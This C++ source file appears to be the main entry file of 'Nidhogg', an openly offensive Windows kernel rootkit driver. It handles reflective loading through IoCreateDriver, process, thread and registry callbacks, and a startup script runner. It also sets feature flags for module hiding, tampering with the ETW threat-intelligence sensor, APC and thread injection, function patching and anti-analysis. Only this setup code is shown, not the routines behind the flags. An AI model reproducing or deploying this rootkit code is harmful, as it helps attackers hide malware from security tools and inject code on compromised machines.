#include "pch.h"
#include "Nidhogg.h"

extern "C"
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
#ifdef DRIVER_REFLECTIVELY_LOADED
	UNREFERENCED_PARAMETER(DriverObject);
	UNREFERENCED_PARAMETER(RegistryPath);
	Features.DriverReflectivelyLoaded = true;
	Features.ProcessProtection = false;
	Features.ThreadProtection = false;
	Features.RegistryFeatures = false;
	Print(DRIVER_PREFIX "Driver is being reflectively loaded...\n");

	UNICODE_STRING driverName = RTL_CONSTANT_STRING(DRIVER_NAME);
	UNICODE_STRING routineName = RTL_CONSTANT_STRING(L"IoCreateDriver");
	tIoCreateDriver IoCreateDriver = (tIoCreateDriver)MmGetSystemRoutineAddress(&routineName);

	if (!IoCreateDriver)
		return STATUS_INCOMPATIBLE_DRIVER_BLOCKED;

	NTSTATUS status = IoCreateDriver(&driverName, &NidhoggEntry);

	if (!NT_SUCCESS(status))
		Print(DRIVER_PREFIX "Failed to create driver: (0x%08X)\n", status);
	return status;
#endif

	return NidhoggEntry(DriverObject, RegistryPath);
}

/*
* Description:
* NidhoggEntry is responsible for handling the driver loading process.
*
* Parameters:
* @DriverObject [PDRIVER_OBJECT]  -- The driver object contains a lot of important driver configuration such as DeviceObject, MajorFunctions and more.
* @RegistryPath [PUNICODE_STRING] -- The driver's associated registry path, unused.
*
* Returns:
* @status		[NTSTATUS]		  -- Whether the driver is loaded successfuly or not.
*/
NTSTATUS NidhoggEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
	UNREFERENCED_PARAMETER(RegistryPath);
	NTSTATUS status = STATUS_SUCCESS;

	if (!InitializeFeatures()) {
		ClearAll();
		return STATUS_INCOMPATIBLE_DRIVER_BLOCKED;
	}

	// Setting up the device object.
	UNICODE_STRING deviceName = RTL_CONSTANT_STRING(DRIVER_DEVICE_NAME);
	UNICODE_STRING symbolicLink = RTL_CONSTANT_STRING(DRIVER_SYMBOLIC_LINK);
	UNICODE_STRING altitude = RTL_CONSTANT_STRING(OB_CALLBACKS_ALTITUDE);
	UNICODE_STRING regAltitude = RTL_CONSTANT_STRING(REG_CALLBACK_ALTITUDE);
	PDEVICE_OBJECT DeviceObject = nullptr;

	// Creating device and symbolic link.
	status = IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &DeviceObject);

	if (!NT_SUCCESS(status)) {
		Print(DRIVER_PREFIX "Failed to create device: (0x%08X)\n", status);
		ClearAll();
		return status;
	}

	status = IoCreateSymbolicLink(&symbolicLink, &deviceName);

	if (!NT_SUCCESS(status)) {
		Print(DRIVER_PREFIX "Failed to create symbolic link: (0x%08X)\n", status);
		IoDeleteDevice(DeviceObject);
		ClearAll();
		return status;
	}

	// Registering the process callback function only if the driver isn't reflectively loaded (to avoid BSOD).
	if (!Features.DriverReflectivelyLoaded) {
		OB_OPERATION_REGISTRATION operations[] = {
		{
			PsProcessType,
			OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE,
			OnPreOpenProcess, nullptr
		},
		{
			PsThreadType,
			OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE,
			OnPreOpenThread, nullptr
		}
		};
		OB_CALLBACK_REGISTRATION registrationCallbacks = {
			OB_FLT_REGISTRATION_VERSION,
			REGISTERED_OB_CALLBACKS,
			RTL_CONSTANT_STRING(OB_CALLBACKS_ALTITUDE),
			nullptr,
			operations
		};

		status = ObRegisterCallbacks(&registrationCallbacks, &RegistrationHandle);

		if (!NT_SUCCESS(status)) {
			Print(DRIVER_PREFIX "Failed to register process callback: (0x%08X)\n", status);
			status = STATUS_SUCCESS;
			Features.ProcessProtection = false;
			Features.ThreadProtection = false;
		}

		status = CmRegisterCallbackEx(OnRegistryNotify, &regAltitude, DriverObject, nullptr, &NidhoggRegistryUtils->RegCookie, nullptr);

		if (!NT_SUCCESS(status)) {
			Print(DRIVER_PREFIX "Failed to register registry callback: (0x%08X)\n", status);
			status = STATUS_SUCCESS;
			Features.RegistryFeatures = false;
		}
	}
	else {
		DeviceObject->Flags |= DO_BUFFERED_IO;
		DeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;
	}

	// Setting up functions.
	DriverObject->DriverUnload = NidhoggUnload;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverObject->MajorFunction[IRP_MJ_CLOSE] = NidhoggCreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = NidhoggDeviceControl;

	ExecuteInitialOperations();

	Print(DRIVER_PREFIX "Initialization finished.\n");
	return status;
}

/*
* Description:
* NidhoggUnload is responsible for handling the driver unloading process which includes: Removing all hooks, deleting the symbolic link and the deviceobject.
*
* Parameters:
* @DriverObject [PDRIVER_OBJECT] -- The driver object contains a lot of important driver configuration such as DeviceObject, MajorFunctions and more.
*
* Returns:
* There is no return value.
*/
void NidhoggUnload(PDRIVER_OBJECT DriverObject) {
	Print(DRIVER_PREFIX "Unloading...\n");

	if (Features.RegistryFeatures) {
		NTSTATUS status = CmUnRegisterCallback(NidhoggRegistryUtils->RegCookie);

		if (!NT_SUCCESS(status)) {
			Print(DRIVER_PREFIX "Failed to unregister registry callbacks: (0x%08X)\n", status);
		}
	}

	ClearAll();

	// To avoid BSOD.
	if (Features.ThreadProtection && Features.ProcessProtection && RegistrationHandle) {
		ObUnRegisterCallbacks(RegistrationHandle);
		RegistrationHandle = NULL;
	}

	UNICODE_STRING symbolicLink = RTL_CONSTANT_STRING(DRIVER_SYMBOLIC_LINK);
	IoDeleteSymbolicLink(&symbolicLink);
	IoDeleteDevice(DriverObject->DeviceObject);
}

/*
* Description:
* ExecuteInitialOperations is responsible for executing initial opeartions script.
*
* Parameters:
* There are no parameters.
*
* Returns:
* There is no return value.
*/
void ExecuteInitialOperations() {
	ScriptManager* scriptManager = nullptr;
	ScriptInformation scriptInfo{};

	if (InitialOperationsSize == 0 || !InitialOperations)
		return;

	scriptInfo.ScriptSize = InitialOperationsSize;
	MemoryAllocator<PVOID> scriptAllocator(&scriptInfo.Script, scriptInfo.ScriptSize);
	NTSTATUS status = scriptAllocator.CopyData((PVOID)InitialOperations, scriptInfo.ScriptSize);

	if (!NT_SUCCESS(status))
		return;

	__try {
		scriptManager = new ScriptManager();
		status = scriptManager->ExecuteScript((PUCHAR)scriptInfo.Script, scriptInfo.ScriptSize);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		status = GetExceptionCode();
	}

	if (scriptManager) {
		delete scriptManager;
		scriptManager = nullptr;
	}

	if (!NT_SUCCESS(status))
		Print(DRIVER_PREFIX "Failed to execute initial operations (0x%08X)\n", status);
	else
		Print(DRIVER_PREFIX "Executed initial opeartions successfully.\n");
}

/*
* Description:
* NidhoggCreateClose is responsible for creating a success response for given IRP.
*
* Parameters:
* @DeviceObject [PDEVICE_OBJECT] -- Not used.
* @Irp			[PIRP]			 -- The IRP that contains the user data such as SystemBuffer, Irp stack, etc.
*
* Returns:
* @status		[NTSTATUS]		 -- Always will be STATUS_SUCCESS.
*/
NTSTATUS NidhoggCreateClose(PDEVICE_OBJECT, PIRP Irp) {
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

/*
* Description:
* ClearAll is responsible for freeing all allocated memory and cleaning all the globals.
*
* Parameters:
* There are no parameters.
*
* Returns:
* There is no return value.
*/
void ClearAll() {
	delete NidhoggProccessUtils;
	delete NidhoggFileUtils;
	delete NidhoggMemoryUtils;
	delete NidhoggAntiAnalysis;
	delete NidhoggRegistryUtils;
	delete NidhoggNetworkUtils;
}

/*
* Description:
* InitializeFeatures is responsible for initializing the features and the globals.
*
* Parameters:
* There are no parameters.
*
* Returns:
* There is no return value.
*/
bool InitializeFeatures() {
	// Get windows version.
	RTL_OSVERSIONINFOW osVersion = { sizeof(osVersion) };
	NTSTATUS result = RtlGetVersion(&osVersion);

	if (!NT_SUCCESS(result))
		return false;

	WindowsBuildNumber = osVersion.dwBuildNumber;

	if (WindowsBuildNumber < WIN_1507)
		return false;

	UNICODE_STRING routineName = RTL_CONSTANT_STRING(L"ExAllocatePool2");
	AllocatePool2 = MmGetSystemRoutineAddress(&routineName);

	// Initialize utils.
	NidhoggProccessUtils = new ProcessUtils();

	if (!NidhoggProccessUtils)
		return false;

	NidhoggFileUtils = new FileUtils();

	if (!NidhoggFileUtils)
		return false;

	NidhoggMemoryUtils = new MemoryUtils();

	if (!NidhoggMemoryUtils)
		return false;

	NidhoggAntiAnalysis = new AntiAnalysis();

	if (!NidhoggAntiAnalysis)
		return false;

	NidhoggRegistryUtils = new RegistryUtils();

	if (!NidhoggRegistryUtils)
		return false;

	NidhoggNetworkUtils = new NetworkUtils();

	if (!NidhoggNetworkUtils)
		return false;

	// Initialize functions.
	if (!(PULONG)MmCopyVirtualMemory)
		Features.ReadData = false;

	if (!(PULONG)ZwProtectVirtualMemory || !Features.ReadData)
		Features.WriteData = false;

	if (!Features.WriteData || !(PULONG)PsGetProcessPeb)
		Features.FunctionPatching = false;

	if (!(PULONG)PsGetProcessPeb || !(PULONG)PsLoadedModuleList || !&PsLoadedModuleResource)
		Features.ModuleHiding = false;

	if (!(PULONG)ObReferenceObjectByName)
		Features.FileProtection = false;

	if (!(PULONG)KeInsertQueueApc)
		Features.EtwTiTamper = false;

	if (!(PULONG)KeInitializeApc || !(PULONG)KeInsertQueueApc || !(PULONG)KeTestAlertThread || !(PULONG)ZwQuerySystemInformation)
		Features.ApcInjection = false;

	if (NidhoggMemoryUtils->FoundNtCreateThreadEx())
		Features.CreateThreadInjection = true;
	return true;
}
